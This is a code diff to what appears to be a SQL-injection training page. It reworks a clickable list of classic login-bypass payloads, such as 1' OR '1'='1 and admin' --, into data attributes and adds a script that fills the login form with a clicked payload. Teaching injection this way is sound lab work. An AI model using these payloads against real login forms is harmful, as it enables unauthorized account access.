@@ -246,16 +246,16 @@ $conn->close();
             <h3>🎯 万能密码Payload</h3>
             <div class="payload-list">
                 <h4>1. 基本万能密码</h4>
-                <code onclick="setLogin('admin', '1\' OR \'1\'=\'1')">用户名: admin, 密码: 1' OR '1'='1</code>
-                <code onclick="setLogin('admin', '1\' OR \'1\'=\'1\' --)">用户名: admin, 密码: 1' OR '1'='1' --</code>
+                <code class="payload" data-username="admin" data-password="1' OR '1'='1">用户名: admin, 密码: 1' OR '1'='1</code>
+                <code class="payload" data-username="admin" data-password="1' OR '1'='1' --">用户名: admin, 密码: 1' OR '1'='1' --</code>
                 
                 <h4>2. 用户名注入</h4>
-                <code onclick="setLogin('admin\' --', '任意密码')">用户名: admin' --, 密码: 任意密码</code>
-                <code onclick="setLogin('admin\' #', '任意密码')">用户名: admin' #, 密码: 任意密码</code>
+                <code class="payload" data-username="admin' --" data-password="任意密码">用户名: admin' --, 密码: 任意密码</code>
+                <code class="payload" data-username="admin' #" data-password="任意密码">用户名: admin' #, 密码: 任意密码</code>
                 
                 <h4>3. 其他变种</h4>
-                <code onclick="setLogin('admin', '1\' OR 1=1#)">用户名: admin, 密码: 1' OR 1=1#</code>
-                <code onclick="setLogin('admin', '1\') OR \'1\'=\'1')">用户名: admin, 密码: 1') OR '1'='1</code>
+                <code class="payload" data-username="admin" data-password="1' OR 1=1#">用户名: admin, 密码: 1' OR 1=1#</code>
+                <code class="payload" data-username="admin" data-password="1') OR '1'='1">用户名: admin, 密码: 1') OR '1'='1</code>
             </div>
         </div>
 
@@ -304,6 +304,18 @@ $user = $stmt->fetch();
             document.getElementById('username').value = username;
             document.getElementById('password').value = password;
         }
+        
+        // 为所有payload元素添加点击事件
+        document.addEventListener('DOMContentLoaded', function() {
+            var payloads = document.querySelectorAll('.payload');
+            payloads.forEach(function(payload) {
+                payload.addEventListener('click', function() {
+                    var username = this.getAttribute('data-username');
+                    var password = this.getAttribute('data-password');
+                    setLogin(username, password);
+                });
+            });
+        });
     </script>
 </body>
 </html>
